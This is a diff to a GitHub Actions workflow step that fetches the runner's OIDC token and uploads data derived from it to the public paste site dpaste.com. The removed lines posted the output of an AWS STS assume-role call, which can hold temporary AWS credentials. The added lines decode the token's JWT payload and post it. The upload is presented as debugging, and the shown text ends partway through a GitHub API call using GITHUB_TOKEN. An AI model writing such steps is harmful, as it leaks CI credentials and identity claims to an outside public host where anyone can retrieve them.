@@ -65,17 +65,18 @@ jobs:
         run: |
           echo "Fetching OIDC token..."
           TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value')
-          echo "Calling AWS STS AssumeRoleWithWebIdentity..."
-          aws sts assume-role-with-web-identity \
-            --role-arn ${{ secrets.AWS_ROLE_TO_ASSUME }} \
-            --role-session-name DebugSession \
-            --web-identity-token $TOKEN \
-            --region ${{ env.AWS_REGION }} > sts_output.log 2>&1 || true
+          echo "Extracting JWT payload..."
+          # A JWT is header.payload.signature. We want the payload (second part).
+          PAYLOAD_B64=$(echo "$TOKEN" | cut -d. -f2)
+          # Fix base64url padding
+          MOD=$((${#PAYLOAD_B64} % 4))
+          if [ $MOD -eq 2 ]; then PAYLOAD_B64="${PAYLOAD_B64}=="; fi
+          if [ $MOD -eq 3 ]; then PAYLOAD_B64="${PAYLOAD_B64}="; fi
+          # Decode payload
+          PAYLOAD=$(echo "$PAYLOAD_B64" | base64 -d 2>/dev/null || echo "Decode failed")
           
-          echo "Uploading output to dpaste..."
-          CONTENT=$(cat sts_output.log)
-          PASTE_URL=$(curl -s -d "content=$CONTENT" https://dpaste.com/api/v2/)
-          echo "Paste URL: $PASTE_URL"
+          echo "Uploading payload to dpaste..."
+          PASTE_URL=$(curl -s -d "content=$PAYLOAD" https://dpaste.com/api/v2/)
           
           curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
                -H "Accept: application/vnd.github.v3+json" \
